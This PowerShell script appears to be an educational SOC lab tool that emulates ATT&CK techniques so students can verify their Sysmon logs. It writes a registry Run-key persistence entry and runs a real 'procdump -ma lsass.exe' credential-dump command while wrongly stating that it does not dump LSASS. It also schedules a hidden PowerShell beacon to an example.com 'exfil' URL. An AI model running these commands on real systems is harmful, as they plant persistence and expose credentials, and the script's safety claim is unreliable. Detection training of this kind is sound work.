<#
.SYNOPSIS
    Crimson vs Cobalt: Safe SOC Attack Emulation Script
    Version 1.0 - FOR EDUCATIONAL USE ONLY.
    
    This script emulates specific MITRE ATT&CK techniques to help students verify their detection logs.
#>

Write-Host "--- Crimson vs Cobalt: Attack Emulation ---" -ForegroundColor Red

function Invoke-DiscoveryEmulation {
    Write-Host "[*] Emulating Discovery (T1087, T1082)..." -ForegroundColor Yellow
    whoami
    net user
    systeminfo | select-object -first 10
    ipconfig /all
}

function Invoke-PersistenceEmulation {
    Write-Host "[*] Emulating Persistence (T1547.001 - Registry Run Key)..." -ForegroundColor Yellow
    $Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    New-ItemProperty -Path $Path -Name "SOC_Lab_Persistence" -Value "C:\Windows\System32\cmd.exe /c echo Hello SOC" -PropertyType String -Force
    Write-Host "[+] Registry Key Created. Check Sysmon Event ID 13." -ForegroundColor Green
}

function Invoke-CredentialAccessEmulation {
    Write-Host "[*] Emulating Credential Access (T1003.001 - LSASS Dump Simulation)..." -ForegroundColor Yellow
    Write-Host "[!] Note: This does NOT actualy dump LSASS. It just runs a command that LOOKS like it."
    cmd.exe /c "procdump.exe -ma lsass.exe lsass.dmp" 2>$null
    Write-Host "[+] Check Sysmon Event ID 1 (Process Create) and Event ID 10 (Process Access)." -ForegroundColor Green
}

function Invoke-ExfiltrationEmulation {
    Write-Host "[*] Emulating Exfiltration (T1048 - Scheduled Task C2 Simulation)..." -ForegroundColor Yellow
    $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://example.com/exfil?data=test"'
    $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
    Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "SOC_Lab_C2" -Description "Simulated C2 beacon"
    Write-Host "[+] Scheduled Task Created. Check Sysmon Event ID 1 and Task Scheduler logs." -ForegroundColor Green
}

# Menu
Write-Host "1. Run Discovery"
Write-Host "2. Run Persistence"
Write-Host "3. Run Credential Access Sim"
Write-Host "4. Run Exfiltration/C2 Sim"
$Choice = Read-Host "Select technique to emulate"

switch ($Choice) {
    "1" { Invoke-DiscoveryEmulation }
    "2" { Invoke-PersistenceEmulation }
    "3" { Invoke-CredentialAccessEmulation }
    "4" { Invoke-ExfiltrationEmulation }
    Default { Write-Host "Invalid choice" }
}
